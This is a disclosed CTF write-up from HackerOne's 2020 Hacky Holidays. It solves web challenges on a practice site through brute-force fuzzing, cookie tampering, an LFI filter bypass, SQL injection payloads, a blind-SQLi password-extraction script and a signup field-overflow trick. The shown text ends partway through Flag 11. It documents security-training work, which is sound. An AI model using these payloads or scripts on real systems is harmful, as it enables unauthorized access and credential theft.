# HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags

## Report Details
- **Report ID**: 1068434
- **URL**: https://hackerone.com/reports/1068434
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-29T20:47:36.296Z
- **Disclosed**: 2021-01-11T22:37:04.318Z

## Reporter
- **Username**: liamg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## Intro

This is my report for the 2020 Hacky Holidays HackerOne CTF. I managed to find all 12 flags with the assistance of my little helper, Jake. He specialises in brute-forcing via a unique keyboard mashing technique:

{F1134543}

Anywho, let's get started...

## Flag 1: Robots

The first one was a nice easy find as a result of some basic enumeration.

Looking in [/robots.txt](https://hackyholidays.h1ctf.com/robots.txt), I immediately spotted the flag:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Flag: `flag{48104912-28b0-494a-9995-a203d1e261e7}`

## Flag 2: Moved

The content of the `robots.txt` file also contained a clue about the second flag:

```
Disallow: /s3cr3t-ar3a
```

There was a [/s3cr3t-ar3a](https://hackyholidays.h1ctf.com/s3cr3t-ar3a) page which the server requested spiders to avoid. Very suspect!

The secret area consisted of a message telling me the page had moved.

If I had hit "inspect element" and browsed the DOM I could have quite quickly spotted the flag.

{F1134542}

However...

### Unintended Solution

I'm ashamed to say I went the much longer way around. I initially viewed the static source code of the page, and noticed that the jQuery library wasn't loaded from a CDN like everything else on the site.

Viewing the file showed the version of jQuery:

```
/*! jQuery v3.5.1 ...
```

I downloaded the file and then grabbed the "real" jQuery v3.5.1. Diffing them showed an interesting anomaly in the CTF version of the file:

{F1134541}

Interesting! Piecing it together revealed the flag. At this point I realised I could have just inspected element and seen the flag. Whoops.

Flag: `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

## Flag 3: People Rater

The last challenge hinted at the existence of the `/apps` page. On this page I found another link, this time to the People Rater application at [/people-rater](https://hackyholidays.h1ctf.com/people-rater).

I was presented with a list of buttons, each with the name of a person. Clicking a button resulted in an alert box with a description of the person.

Digging a little deeper with dev tools, I could see that when I clicked a button, an HTTP request was made in the background. One such example is `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=`, which responded with:

```json
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

It looked like that `id` was base64 encoded. Decoding it resulted in:

```json
{"id":2}
```

Going through the rest of the list and decoding the `id` field for each revealed that there was no record with an `id` of `1` in the list. Perhaps there was something interesting in the missing record?

I base64 encoded some JSON with an `id` of `1`:

```bash
$ echo '{"id":1}' | base64 
eyJpZCI6MX0K
```

...and supplied the resultant value to the `entry` endpoint: [/people-rater/entry?id=eyJpZCI6MX0K](https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0K), and got a nice response:

```json
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

There was the flag!

Flag: `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`

## Flag 4: Swag Shop

A quick browse of the swag shop source code revealed the existence of an API:

{F1134539}

I decided to try a bit of fuzzing to reveal any other API endpoints that might help me to progress.

Fuzzing with:

```bash
scout url -s https://hackyholidays.h1ctf.com/swag-shop/api
```

...revealed:

```
/swag-shop/api/user
/swag-shop/api/sessions
```

Hitting the `user` endpoint gave a 400 status and told me I was missing required parameters. I put that to one side for a moment and started to look at `sessions` instead.

The `sessions` endpoint returned a list of sessions!

```json
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
```

These looked like base64, so I decoded them:

```bash
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq

{
  "user": null,
  "cookie": "YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
}
{
  "user": null,
  "cookie": "ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="
}
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
{
  "user": null,
  "cookie": "MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="
}
{
  "user": null,
  "cookie": "M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="
}
{
  "user": null,
  "cookie": "MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="
}
{
  "user": null,
  "cookie": "MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="
}
{
  "user": null,
  "cookie": "OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="
}
```

I now had a session associated with an authenticated user (the third one down in the list). Using the cookie didn't seem to have any effect, so I went back to try and figure out what was up with the `user` endpoint.

This time I used `wfuzz` to try and find the missing parameter(s).

```bash
wfuzz --hc=400 -zfile,wordlists/params.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1
```

This revealed the `uuid` parameter:

{F1134540}

When I decoded the session data, there was a UUID (`C7DCCE-0E0DAB-B20226-FC92EA-1B9043`) included in the `user` parameter. This couldn't be a coincidence! I used it in the `uuid` parameter on the `user` endpoint:

```bash
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}% 
```

And there was the flag!

Flag: `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`

## Flag 5: Secure Login

The page at [/secure-login](https://hackyholidays.h1ctf.com/secure-login) consisted of a fairly minimal login form.

Trying SQL injection etc. yielded no results, but there was an interesting error message here when I entered some gibberish:

{F1134538}

The login page specifically told me when the supplied username was invalid, as opposed to giving a generic "login failed" message that didn't explain whether it was the username or password at fault. This means I could brute-force for a valid username.

I cracked open wfuzz again:

```bash
$ wfuzz -zfile,wordlists/usernames.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login

********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: https://hackyholidays.h1ctf.com/secure-login
Total requests: 22342

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                             
===================================================================

000005730:   200        36 L     84 W     1724 Ch     "access"  
```

Nice, wfuzz found a username: `access`. I tried to login with this username and a random password, and got a new error:

{F1134537}

Next it was just a matter of brute forcing the password...

```
wfuzz -zfile,wordlists/passwords.txt --hs 'Invalid Password' -d 'username=access&password=FUZZ' https://hackyholidays.h1ctf.com/secure-login 

********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: https://hackyholidays.h1ctf.com/secure-login
Total requests: 9953

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                             
===================================================================

000000053:   302        0 L      0 W      0 Ch        "computer" 
```

...and then I had a password too! I tried to login with `access:computer` to collect the flag!

{F1134536}

...or maybe not. There was no flag there. I took a look around at the new page and noticed the `securelogin` cookie that had been set during login.

{F1134535}

The cookie had a value of `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`, which base64 decoded to `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. I encoded a new JSON object with `admin` set to `true` and refreshed the page, hoping to elevate my access...

```
$ echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64 -w0
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo=
```

Setting the `securelogin` cookie to the value encoded above and reloading the page revealed a new file I could now download.

{F1134534}

I downloaded the `my_secure_files_not_for_you.zip`, and found it was password protected. A great tool for brute forcing zip passwords is `fcrackzip`, so I pointed it at the archive and pulled the trigger:

```
fcrackzip -u -D -p wordlists/passwords.txt my_secure_files_not_for_you.zip    

PASSWORD FOUND!!!!: pw == hahahaha
```

The password was `hahahaha`! Unzipping revealed two interesting things. 

Firstly I had what appeared to be a Grinch nude (!?)

{F1134533}

I'm not sure what impact this had on my one-year old son who was watching. I guess I'll find out in a few years. Anyway, the other file was `flag.txt`:

```bash
$ cat flag.txt 
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

Solved!

Flag: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

## Flag 6: Diary

The challenge started at `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`. This straight-up looked like an LFI vulnerability, so I tried a few obvious values for the `template` parameter such as `/etc/passwd`, `../../../../../../../etc/passwd` and found nothing - everything resulted in a redirect back to the original URL.

I thought it'd be a good idea to try to locate `entries.html` and see if it was publicly accessible. It turned out that `https://hackyholidays.h1ctf.com/my-diary/entries.html` was it's actual location. In that case, the `template` parameter was loading files relative to it's own directory. For that reason I tried `index.php` as a `template` value, to trick the script into providing me with it's own source code:

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

It worked! I now had the source code of the script. It looked like there was once an `admin.php` page, which according to a comment, had been renamed to `secretadmin.php`. Trying to hit that file directly in the browser resulted in:

```
You cannot view this page from your IP Address
```

I couldn't simply pass `secretadmin.php` as an argument to the original script to read the file, because it did a couple of string replacements on the passed parameter:

```
// ...
$page = str_replace("admin.php","",$page);
// ...
$page = str_replace("secretadmin.php","",$page);
// ...
```

So passing `secretadmin.php` would result in a value of `secret`, because of the `s/admin\.php//` replacement.

I bypassed this questionable security measure by passing a value of `secretadsecretaadmin.phpdmin.phpmin.php`.

This works because:

1. Replacing `admin.php` in `secretadsecretaadmin.phpdmin.phpmin.php` results in `secretadsecretadmin.phpmin.php`
2. Replacing `secretadmin.php` in `secretadsecretadmin.phpmin.php` results in `secretadmin.php`

```bash
$ curl -s https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php | grep flag
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
```

Success!

Flag: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

## Flag 7: Hate Mail Generator

Starting out, I could see I had access to some sort of email campaign management application.

{F1134531}

Clicking `Create New` prompted for `name`, `subject` and `markup` fields. Having access to a `markup` field made me think this was going to be something like XSS or SSTI.

Looking at the campaign which was already there provided another interesting bit of info:

{F1134532}

It seemed the templating language supported the inclusion of other files. An LFI vuln? I set up a new campaign with a `template` directive for a file which didn't exist:

{F1134530}

Hitting `Preview` resulted in an error which disclosed the location of a `templates` directory.

```
Cannot find template file /templates/whatever
```

Directory listings were enabled for the [/hate-mail-generator/templates/]( https://hackyholidays.h1ctf.com/hate-mail-generator/templates/) directory, and disclosed the existence of `38dhs_admins_only_header.html`. 

{F1134529}

Navigating to this file directly resulted in a `403`, so I tried to use the `template` directive again to read it via a campaign preview:

{F1134528}

My smugness dissipated when the approach failed with `You do not have access to the file 38dhs_admins_only_header.html`.

Taking a step back and doing a bit more recon meant that I spotted an HTML block that looked helpful:

{F1134527}

Whilst the markup in the campaign editor did not allow the inclusion of the admin-only file, perhaps this content did? First of all I adjusted the content to the following with dev tools:

{F1134526}

Then I set the content of the campaign markup to `{{name}}` to make use of the variable I modified. Hitting preview then gave me the flag:

{F1134525}

Flag: `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

## Flag 8: Forum

After taking a look around this forum, I couldn't find any immediate issues. Fuzzing revealed the presence of phpMyAdmin at [/forum/phpmyadmin](https://hackyholidays.h1ctf.com/forum/phpmyadmin), but the default login did not work.

In order to check if the forum was based on any open-source software, I searched for one of the messages: `You need to be an admin to view these posts` on [GitHub](https://github.com/search?q=%22You+need+to+be+an+admin+to+view+these+posts%22&type=code). Not only was it running software that was found on GitHub, the code was listed under the organisation `Grinch-Networks`.

{F1134524}

Browsing the commit history revealed some juicy database credentials that looked to have been committed by accident at some stage and later removed: `forum:6HgeAZ0qC9T6CQIqJpD`

{F1134523}

I logged in to phpMyAdmin with the discovered credentials. Browsing the users table revealed some usernames and hashed passwords. The other tables were not accessible in phpMyAdmin.

{F1134522}

Instead of cracking the hashes, I googled them - it's a much quicker way to crack hashes than bruting them locally! The `grinch` users hash was `35D652126CA1706B59DB02C93E0C9FBF`, and turned out to be a hash of `BahHumbug`.

At this point I could log in to the forum with `grinch:BahHumbug` and view an admin-only post containing the flag.

{F1134521}

Flag: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

## Flag 9: Evil Quiz

Filling out the quiz with some random answers to get a feel for the process resulted in the following page being shown:

{F1134519}

The message about the number of players with the same name was quite revealing here. It told me that the quiz was *stateful*. It remembered the names of all players that filled it out. This meant there was likely a database backing this application. I immediately started thinking along the lines of a potential SQL injection vulnerability.

I went back to the beginning and set the `name` field to `' OR sleep(5)='`. Proceeding into the rest of the quiz resulted in 5 second delays, meaning an SQL injection vulnerability was indeed present. The final page included the message `There is 1195892 other player(s) with the same name as you!` which suggests my attack was at least working on the query to calculate the number of players with a similar name.

I started the process of working out what tables/columns existed and what data I could exfiltrate.

First of all I worked out the number of columns being returned in the query by trying the following:

| Name                             | # of players |
|----------------------------------|--------------|
| `Jfjrir' union select 1;/*`         | 0            |
| `Jfjrir' union select 1,2;/*`       | 0            |
| `Jfjrir' union select 1,2,3;/*`     | 0            |
| `Jfjrir' union select 1,2,3,4;/*`   | 1            |

4 columns then! Normally at this point I'd start pulling data from `information_schema.tables`, but before resorting to this I tested to see if I could guess the names of some existing tables. I got lucky and ` Jfjrir' union select 1,2,3,4 from admin;/*` returned a single row (player).

After tweaking the query a few times I figured out that a user with the `username` of `admin` existed in the table - at this point I started writing a script to pull out the `admin` password:

```python
#!/usr/bin/env python3
import requests

url='https://hackyholidays.h1ctf.com/evil-quiz'
cookies={'session': '4fbc0cc824c9ee373d677e1840288aaf'}
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'

def attack(password):
    index=len(password)+1
    for letter in alphabet:
        data={'name': "Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
        r = requests.post(url, cookies=cookies, data=data)
        r = requests.get(url + '/score', cookies=cookies)
        if 'There is 1 other' in r.text:
            return password + letter
    return password

password=''
while True:
    np=attack(password)
    if np == password:
        print("Password found: '%s'" % (password))
        break
    password=np

```

Running the script:

```bash
$ ./quiz.py
Password found: 'S3creT_p4ssw0rd-$'
```

Logging in to the admin area with `admin:S3creT_p4ssw0rd-$` gave me the flag.

Flag: `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

## Flag 10: SignUp Manager

After a little basic recon, I spotted a comment at the top of the initial page:

```html
<!-- See README.md for assistance -->
```

There was indeed a [/signup-manager/README.md](https://hackyholidays.h1ctf.com/signup-manager/README.md), which contained:

```markdown
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Lots of info there! After playing with the form it seemed I could add users and sign in as them, so it made sense that I needed to elevate my privileges to `admin` level to find the flag. Step 6 in the README mentioned tweaking the last character of the `users.txt` file in order to make somebody admin, so it looked like I needed to find a way to do that.

The README also mentioned a `signupmanager.zip` file which was also available in the same directory. I downloaded and extracted it.

At this point I was stuck for about 8 hours, as for me the zip was corrupt and only extracted a single file. This seems to have happened to others according to Twitter so not sure what happened there, but after downloading it again later it contained more files. Weird!

Anyway, the `index.php` contained the following:

```php
<?php
if( isset($_GET["logout"]) ){
    setcookie('token',null,time()-3600);
    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
    exit();
}
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
$all_users = buildUsers();
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
if( $page == 'signup.php' ) {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once($page);
```

So each field in the `users.txt` has it's length capped to a set value. This meant that whether or not the user was an admin `Y/N` was always present at the same offset for each line.

If I could find a way to make another field too long, I could shift my own content (`Y`) into the position of the `N` and become admin. All of the fields are explicitly capped to certain lengths, except for `age`.

I ascertained the following about the `age` field from the above code:

- It must be numeric
- It must have a maximum string length of 3
- It will be padded to a length of 3 characters if it is too short (<3 chars)
- Is preceeded in users.txt by the `lastname` field.

I realised the exponent format value `1e3` would meet the above criteria, but be longer than 3 characters when converted to an integer (`1000`). This would mean the last character of my last name would be pushed into the `admin` field. So setting the last character of my last name to `Y` and making sure it was the maximum length of a last name (15 characters) should result in the system signing me up as an admin user.

I signed up with an age of `1e3` (using dev tools to change the value of the dropdown option):

{F1134520}

...and a last name of `YYYYYYYYYYYYYYY`...

{F1134518}

...and was presented with the flag. Success!

Flag: `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

## Flag 11: Recon

No new app was added for this challenge, so at first I wasn't sure where to start. Going back and completing the previous flag again resulted in a new message being shown with a link to a new directory: [/r3c0n_server_4fdk59](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59).

{F1134517}

There was a lot going on here. First of all the presence of an API was mentioned at the top of the page. Then there was a list of recon photo albums, each containing one or more photos. Additionally, a link to an "attack box" was included that resulted in a login page.

### API

Since the comment mentioned an API, I tried [/r3c0n_server_4fdk59/api](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api) and found a page about API response codes.

{F1134515}

I tried fuzzing the `/r3c0n_server_4fdk59/api` path for endpoints, but all requests resulted in a 401 status code. The docs note that a 401 means `Unauthenticated Request or Invalid client IP` in this context. So I either needed to bolt on an `Authorization` header to our requests, or I needed to make the requests from a particular location, likely `localhost`.

### Recon Gallery

I tried messing with the parameters of each gallery script, and found that adding `' or '1'='2` to the end of the `/r3c0n_server_4fdk59/album?hash=jdh34k` URL was successful, and it looked vulnerable to SQL injection.

After some manual fiddling, I ascertained that there were two tables, but sadly no sensitive data available. 

I used the following to dump the tables and columns:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20ALL%20SELECT%201,%27BLAH%27,group_concat(concat(table_name,%27:%27,column_name))%20from%20information_schema.columns%20WHERE%20table_schema=%27recon%27;/*
```

Here's an example of most of the database content being dumped:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20ALL%20SELECT%201,%27BLAH%27,group_concat(concat(%27\n\nPhoto%20ID:%20%27,%20photo.id,%27%20\nPhoto:%27,photo,%27%20%20\nAlbum%20hash:%20%27,%20hash,%27\nAlbum%20ID:%20%27,album.id))%20from%20photo%20LEFT%20JOIN%20album%20on%20album.id%3dphoto.album_id%20limit%201;/*
```

The above spat out:

```
Photo ID: 1 
Photo:0a382c6177b04386e1a45ceeaa812e4e.jpg  
Album hash: 3dir42
Album ID: 1,

Photo ID: 2 
Photo:1254314b8292b8f790862d63fa5dce8f.jpg  
Album hash: 3dir42
Album ID: 1,

Photo ID: 3 
Photo:32febb19572b12435a6a390c08e8d3da.jpg  
Album hash: 59grop
Album ID: 2,

Photo ID: 4 
Photo:db507bdb186d33a719eb045603020cec.jpg  
Album hash: jdh34k
Album ID: 3,

Photo ID: 5 
Photo:9b881af8b32ff07f6daada95ff70dc3a.jpg  
Album hash: jdh34k
Album ID: 3,

Photo ID: 6 
Photo:13d74554c30e1069714a5a9edda8c94d.jpg  
Album hash: jdh34k
Album ID: 3
```

At this point it looked like there was nothing else in the database to squeeze out.

